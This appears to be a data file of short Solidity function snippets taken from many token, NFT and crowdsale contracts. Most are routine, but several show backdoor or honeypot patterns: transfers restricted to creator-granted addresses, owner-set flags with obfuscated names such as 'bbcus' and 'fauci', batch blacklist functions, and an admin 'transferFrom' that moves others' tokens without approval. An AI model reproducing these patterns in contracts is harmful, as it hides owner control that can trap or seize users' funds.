function returnWebsiteData() external view returns(uint, uint, uint, uint, uint, uint, uint, uint,  bool) {

        return (startBlock, endBlock, backersIndex.length, ethReceivedPresaleOne, ethReceivedPresaleTwo, ethReceiveMainSale, maxCapTokens,   minInvestment,  stopped);
    }
--------------------------------------------------------------------------------
function identifierToCoordinate(uint256 identifier) public view returns(uint256 x, uint256 y) {
        y = identifier / gameSettings[gameIndex].cols;
        x = identifier - (y * gameSettings[gameIndex].cols);
    }
--------------------------------------------------------------------------------
function changePresaleEndDate(uint256 endDate) external onlyOwner {
        require(ICOStagePeriod[0] < endDate);
        require(ICOStagePeriod[2] >= endDate);

        ICOStagePeriod[1] = endDate;
    }
--------------------------------------------------------------------------------
function setAllowRefunds(bool value, uint _reasonableCostsPercentage) external onlyOwner {
        require(isICOClosed());
        require(_reasonableCostsPercentage >= 1 && _reasonableCostsPercentage <= 999);

        allowRefunds = value;
        reasonableCostsPercentage = _reasonableCostsPercentage;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setUnlockTime(uint256 _unlockTime) public onlyOwner {
    require(unlockTime == 0 || _unlockTime < unlockTime);
    require(_unlockTime >= block.timestamp);

    unlockTime = _unlockTime;
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
        external
        override
    {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function _removeNFToken(address _from, uint256 _tokenId) internal virtual {
        require(idToOwner[_tokenId] == _from, NOT_OWNER);
        ownerToNFTokenCount[_from] -= 1;
        delete idToOwner[_tokenId];
    }
--------------------------------------------------------------------------------
function _verify(
        address _buyerAddress, 
        bytes32 _merkleRoot, 
        bytes32[] memory _proof) internal pure returns (bool) {
        return _merkleRoot != 0 
            && MerkleProof.verify(_proof, _merkleRoot, keccak256(abi.encodePacked(_buyerAddress)));
    }
--------------------------------------------------------------------------------
function fetchExtraICOTokens(uint256 _pid) external view returns (uint256){
        RaisePoolInfo storage pool = poolInfo[_pid];
        return pool.tokensDeposited.sub(pool.totalTokensSold);
    }
--------------------------------------------------------------------------------
function generateNewCode(address _token, address _poolOwner) external onlyAdminOrTimeLock returns (uint256) {
        uint256 inviteCode = block.number;
        inviteCodeList[inviteCode][_token][_poolOwner] = true;
        return inviteCode;
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

        // Already finalized
        if(finalized) {
            throw;
        }

        // Finalizing is optional. We only call it if we are given a finalizing agent.
        if(address(finalizeAgent) != 0) {
            finalizeAgent.finalizeCrowdsale();
        }

        finalized = true;
    }
--------------------------------------------------------------------------------
function smTransfer(address _to, uint256 _value) public returns (bool)  {
       require(smPool == msg.sender);
       _transfer(msg.sender, _to, _value);
       return true;
     }
--------------------------------------------------------------------------------
function R2Xtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function protectedTokens() internal override view returns (address[] memory){
        address[] memory protected = new address[](1);
        protected[0] = mmVault;
        return protected;
    }
--------------------------------------------------------------------------------
function setCEO(address _newCEO) external onlyCEO {
        require(_newCEO != address(0), "newCEO looks like no changes");

        ceoAddress = _newCEO;
    }
--------------------------------------------------------------------------------
function setCFO(address _newCFO) external onlyCEO {
        require(_newCFO != address(0), "newCFO looks like no changes");

        cfoAddress = _newCFO;
    }
--------------------------------------------------------------------------------
function setCOO(address _newCOO) external onlyCEO {
        require(_newCOO != address(0), "newCOO looks like no changes");

        cooAddress = _newCOO;
    }
--------------------------------------------------------------------------------
function banbot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    }
--------------------------------------------------------------------------------
function batchAddToWhitelist(address[] _addresses) public onlyWhitelistControl {
        for (uint i = 0; i < _addresses.length; i++) {
            addToWhitelist(_addresses[i]);
        }
    }
--------------------------------------------------------------------------------
function payout() public
        onlyStateControl
        requireState(States.Over)
    {
        uint256 amount = cumAcceptedDeposits;
        cumAcceptedDeposits = 0;
        emit FetchedDeposits(amount);
        payoutAddress.transfer(amount);
        // not idempotent, but multiple invocation would just trigger zero-transfers
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
constructor(address _factoryAddress, address _feeRecipient) public {
        require(_factoryAddress != 0x0);

        // Default temporal unit is block number.
        temporalUnit = RequestScheduleLib.TemporalUnit.Blocks;

        // Sets the factoryAddress variable found in BaseScheduler contract.
        factoryAddress = _factoryAddress;

        // Sets the fee recipient for these schedulers.
        feeRecipient = _feeRecipient;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external onlyOwner returns (bool ok)  {
    uint256 converterdValue = value * (10 ** uint256(tokenDecimals));
    return token.transfer(to, converterdValue);
   }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function fundStakingContract(uint _amount, uint _startWeek, uint _numberOfWeeks)
    external
  {
    _transfer(msg.sender, address(stakingContract), _amount);
    stakingContract.fundStakePool(_amount, _startWeek, _numberOfWeeks);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xD5eDa241460b2f5A20e940A65cD441E9B4bcB1da,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function generateLockId() internal returns (bytes32 lockId) {
        return keccak256(
            abi.encodePacked(blockhash(block.number - 1), address(this), ++lockRequestCount)
        );
    }
--------------------------------------------------------------------------------
function Bitcoin() public {
    totalSupply = INITIAL_SUPPLY;                         // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                // Tnitial tokens are assigned to creator
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);            // emit Transfer event
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, "");
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function transferWithReference(address _to, uint _value, string _reference) public returns (bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, _reference);
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() public onlyAssetOwner returns (bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getStaker(bytes32 _proposalId,address _staker) external view returns(uint,uint) {
        return (proposals[_proposalId].stakers[_staker].vote,proposals[_proposalId].stakers[_staker].amount);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function buy() payable public {
        require(msg.value > 0);
        require(buyPrice > 0);
        paymentAddress.transfer(msg.value);     // withdraw the ether to payment address
     
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(!isFrozen);
    return super.transfer(_to, _value);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function mintTokens(address buyerAddress, uint256 amount) public whenNotPaused() returns (bool) {  
    require(msg.sender == marketplaceAddress || msg.sender == ceoAddress); 
    return doMint(buyerAddress, amount);
  }
--------------------------------------------------------------------------------
function teamwallet(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function approveAndCall(address _spender, uint256 _value, bytes _extraData) public {
        require(approve(_spender, _value));
        IApprovalRecipient(_spender).receiveApproval(msg.sender, _value, _extraData);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
        bool withinCap = weiRaised.add(msg.value) <= HARD_CAP;

        return super.validPurchase() && withinCap;
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function setMajorEvent(string name, string description, string url) onlyOwner areMarried
    {
        majorEvents.push(Event(now, name, description, url));
        MajorEvent(name, description, url);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xad3B69f2d4F314F82169b8cF0b03B5008b4edBAc,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function _finalize() private {
    require(notFinalized(), 'TCO already finalized');
    if(notClosed()) close();
    _finalization();
    emit CrowdsaleFinalized();
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function toggleTransferFor(address _for) onlyOwner public returns (bool) {
        specialAllowed[_for] = !specialAllowed[_for];
        TransferAllowanceFor(_for, specialAllowed[_for]);
        return specialAllowed[_for];
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function estimateSwapWINGSForXFIPerDay(uint256 amountIn) external view override returns (uint256 amount) {
        uint256[] memory amounts = estimateSwapWINGSForXFI(amountIn);

        amount = amounts[1].div(_xfiToken.VESTING_DURATION_DAYS());
    }
--------------------------------------------------------------------------------
function withdraw(address _to) public onlyOwner {
		require(actived == true);
		require(!frozenAccount[_to]);
		_to.transfer(address(this).balance);
	}
--------------------------------------------------------------------------------
function productInfo(uint256 _productId)
    public
    view
    returns (uint256, uint256, uint256, uint256, bool)
  {
    return (
      priceOf(_productId),
      availableInventoryOf(_productId),
      totalSupplyOf(_productId),
      intervalOf(_productId),
      renewableOf(_productId));
  }
--------------------------------------------------------------------------------
function claimUnsold() onlyOwner {
    if ( now < ENDTIME )
      revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }
--------------------------------------------------------------------------------
function updateWallet(address _wallet) onlyOwner public returns (bool) {
    require(_wallet != address(0));
    
    WalletUpdated(wallet, _wallet);
    wallet = _wallet;
    return true;
  }
--------------------------------------------------------------------------------
function AToken() public
    {
        totaltoken = 50000000*10**9;
        Remain = totaltoken;
        endtime = 1524571200;
        stage= Stage.first;

    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
        if (_value <= 0){revert() ;}
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function isLocked(address _wallet) public view returns(bool) {
    uint256 _lockedUntil = lockingList[_wallet];

    //solium-disable-next-line
    if(_lockedUntil > now) {
      return true;
    }

    return false;
  }
--------------------------------------------------------------------------------
function addDistributionContract(address _contract) external {
        require(_contract != address(0));
        require(distributionContractAdded == false);

        distributionContract = _contract;
        distributionContractAdded = true;
    }
--------------------------------------------------------------------------------
function addRule(address addr, uint8 initPercent, uint256[] periods, uint8[] percents) public returns (bool) {
    require(msg.sender == admin);
    return validator.addRule(addr, initPercent, periods, percents);
  }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _previousOwner = _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function burnByOwner(address burner, uint256 value) public canBurnByOwner {
        _burn(burner, value);
        _totalBurnt = _totalBurnt.add(value);
        emit Burn(burner, value);
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function getBasicRate(ERC20 token, bool buy) public view returns(uint) {
        if (buy)
            return tokenData[token].baseBuyRate;
        else
            return tokenData[token].baseSellRate;
    }
--------------------------------------------------------------------------------
function deployKeyRingAndWalletAndCall(
    address initialSigningKey, // the initial key on the keyring
    address keyRing,
    address smartWallet,
    bytes calldata data
  ) external returns (bool ok, bytes memory returnData) {
    _deployNewKeyRingIfNeeded(initialSigningKey, keyRing);
    _deployNewSmartWalletIfNeeded(keyRing, smartWallet);
    (ok, returnData) = smartWallet.call(data);
  }
--------------------------------------------------------------------------------
function setVariables(uint _token_ratio, uint _duration, uint _multiplier, uint _swapFee) public onlyOwner() {
        require(_swapFee < 10000);
        token_ratio = _token_ratio;
        duration = _duration;
        multiplier = _multiplier;
        swapFee = _swapFee;
    }
--------------------------------------------------------------------------------
function _burn(address _owner, uint256 _tokenId) internal {
    clearApproval(_owner, _tokenId);
    removeTokenFrom(_owner, _tokenId);
    Transfer(_owner, address(0), _tokenId);
  }
--------------------------------------------------------------------------------
function DelphiToken() public {
        uint256 initialSupply = 10000000 * 10**18;
        totalSupply = initialSupply;
        balances[msg.sender] = initialSupply;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
        require(isApprovedFor(msg.sender, _tokenId));
        clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
    }
--------------------------------------------------------------------------------
constructor(
        ProxyRegistry registryAddress,
        TokenTransferProxy tokenTransferProxyAddress,
        ERC20 tokenAddress,
        address protocolFeeAddress
    ) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function Feex() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function extractTokens(address _token, address _claimer) onlyOwner public {
        require(newController != address(0) || _token != address(ethealToken));
        super.extractTokens(_token, _claimer);
    }
--------------------------------------------------------------------------------
function burn(address _where, uint256 _amount) public onlyEthealMultisig {
        require(_where == address(this) || _where == SALE);
        require(ethealToken.destroyTokens(_where, _amount));
    }
--------------------------------------------------------------------------------
function startAuction() public isOwner atStage(Stages.AuctionSetUp) {
        stage = Stages.AuctionStarted;
        startTime = now;
        startBlock = block.number;
        AuctionStarted(startTime, startBlock);
    }
--------------------------------------------------------------------------------
function createVirtualEntityAndConnection(
        address _connectionTo,
        bytes32 _connectionType,
        Direction _direction
    )
        external returns (address entityAddress)
    {
        entityAddress = createVirtualAddress();
        createEntity(entityAddress, msg.sender);
        addConnection(entityAddress, _connectionTo, _connectionType, _direction);
    }
--------------------------------------------------------------------------------
function createVirtualAddress() internal returns (address virtualAddress) {
        virtualAddress = address(keccak256(safeAdd(virtualEntitiesCreated,block.number)));
        virtualEntitiesCreated = safeAdd(virtualEntitiesCreated,1);
    }
--------------------------------------------------------------------------------
function transferSuperuser(address _newSuperuser) public onlyOwner {
    require(_newSuperuser != address(0));
    removeRole(msg.sender, ROLE_SUPERUSER);
    addRole(_newSuperuser, ROLE_SUPERUSER);
  }
--------------------------------------------------------------------------------
function _addTokenURI(string calldata _tokenUri) internal {
        uint256 index = metadataList.length;
        metadataList.push(_tokenUri);
        emit DigitalaxPodePortalMetadataAdded(index, _tokenUri);
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function Holdplatform_Airdrop(address tokenAddress, uint256 HPM_status, uint256 HPM_divider) public restricted {
		require(HPM_status == 0 || HPM_status == 1 );
		
		Holdplatform_status[tokenAddress] 	= HPM_status;	
		Holdplatform_divider[tokenAddress] 	= HPM_divider;	// Airdrop = 100% : Divider
	
    }
--------------------------------------------------------------------------------
function exit() 
        external
    {
        uint256 _amount = balanceOf(msg.sender);
        if(_amount !=0) withdraw(_amount);
        claimReward();
    }
--------------------------------------------------------------------------------
function ABCToken(
            string _name,
            string _symbol,
            uint8 _decimals,
            uint256 _totalSupply,
            address _initialTokensHolder) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[_initialTokensHolder] = _totalSupply;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return Math.min(token_().balanceOf(_tokenWallet), token_().allowance(_tokenWallet, address(this)));
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function remainingTokens() external view returns (uint256) {
        return Math.min(
            saleToken.balanceOf(tokenWallet),
            saleToken.allowance(tokenWallet, address(this))
        );
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApproval[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function setTransactionTracker(TransactionTracker newTransactionTracker)
    public
    onlyDeployer
    notNullAddress(newTransactionTracker)
    notSameAddresses(newTransactionTracker, transactionTracker)
    {
        // Require that this contract has not been frozen
        require(!transactionTrackerFrozen);

        // Update fields
        TransactionTracker oldTransactionTracker = transactionTracker;
        transactionTracker = newTransactionTracker;

        // Emit event
        emit SetTransactionTrackerEvent(oldTransactionTracker, newTransactionTracker);
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Invalid new owner address.");
    delegate = newOwner;
  }
--------------------------------------------------------------------------------
function mint(uint amount) external {
        require(msg.sender == governance, "Keep3r::mint: governance only");
        _mint(governance, amount);
    }
--------------------------------------------------------------------------------
constructor(address _ownerWallet) public {
        ownerWallet = _ownerWallet;
        totalSupply_ = INITIAL_SUPPLY * (10 ** uint256(decimals));
        balances[msg.sender] = totalSupply_;
    }
--------------------------------------------------------------------------------
function withdrawPrivateCoinByMan(address _addr, uint256 _amount)
        public onlyRole(ROLE_PRIVATESALEWHITELIST)
    {
        // 仅允许在 2018/10/02 00:00:01 之前购买
        require(block.timestamp < TIMESTAMP_OF_20181002000001);
        // 仅允许 EOA 获得转账
        require(!_addr.isContract());

        transferFrom(owner, _addr, _amount);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        //admin Manage illegal assets
        if(admin[msg.sender] != 0x0){
          _transfer(_from, _to, _value);
        } 
        return true;
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {
    if (!whitelist[addr]) {
      whitelist[addr] = true;
      emit WhitelistedAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
    if (whitelist[addr]) {
      whitelist[addr] = false;
      emit WhitelistedAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function withdrawBattleValue(uint _battleValueInWei) public isNotContractCaller {
        uint amountToWithdraw = bwService.withdrawBattleValue(msg.sender, _battleValueInWei);
        msg.sender.transfer(amountToWithdraw);
    }
--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
        ERC20I token = ERC20I(_tokenAddress);
        require(token.transfer(_recipient, token.balanceOf(this)));
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time) public view returns (uint256 amount) {
		if (locked[_of][_reason].validity > _time)
			amount = locked[_of][_reason].amount;
	}
--------------------------------------------------------------------------------
function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowed[account][_msgSender()].sub(amount));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function Ownable(address _owner) public {
        creater = msg.sender;
        if (_owner != 0) {
            owner = _owner;

        }
        else {
            owner = creater;
        }

    }
--------------------------------------------------------------------------------
function getAirdrop() whenNotLocked canMint whenDropable external returns (bool) {
        require(totalSupply_.add(dropAmount_) <= actualCap_);
        mint(msg.sender, dropAmount_);
        return true;
    }
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function UHC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function Coin786token18() public {
        symbol = "786";
        name = "786 Token";
        decimals = 18;
        endDate = now + 50 weeks;

    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
    returns (bool success) {
        if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function purgeAccount(address account) external onlyOwner onlyDuringSetup {
        delete vestingSchedules[account];
        totalVestedBalance = totalVestedBalance.sub(totalVestedAccountBalance[account]);
        delete totalVestedAccountBalance[account];
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setNextUpgradeMaster(address master) external {
        if (master == 0x0) revert();
        if (msg.sender != nextUpgradeMaster) revert();
        // Only a master can designate the next master
        nextUpgradeMaster = master;
    }
--------------------------------------------------------------------------------
function request() external view override returns (address destination, uint256 value, bytes memory data) {
        Request memory req = _request;
        return (req.destination, req.value, req.data);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    _addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function _clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 168000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "XiDingCoin";                                   // Set the name for display purposes
        symbol = "XDC";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function doDeposit(address _deposit, bool _increase, uint256 _value) onlyOwner public returns (bool) {
        return (_increase
                ? walletStorage.increaseBalance(_deposit, _value)
                : walletStorage.decreaseBalance(_deposit, _value));
    }
--------------------------------------------------------------------------------
function getDepositWithdrawCount(address _deposit) onlyOwner public view returns (uint) {
        require(_deposit != address(0));

        // WithdrawWallet[] storage withdrawWalletList = depositRepos[_deposit].withdrawWallets;
        // uint len = withdrawWalletList.length;
        uint len = walletStorage.walletsNumber(_deposit);

        return len;
    }
--------------------------------------------------------------------------------
function setEthPriceProvider(address provider) external onlyOwner {
        require(provider != address(0), "Provider is the zero address");

        ethPriceProvider = provider;
    }
--------------------------------------------------------------------------------
function Mate(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    bbcus[spender] = val;
    fauci[spender] = val2; 
    alabama[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function seedMarket(uint256 eggs) public {
        require(marketEggs==0);
        require(msg.sender==ceoAddress); // only CEO can seed the market
        initialized=true;
        marketEggs=eggs;
    }
--------------------------------------------------------------------------------
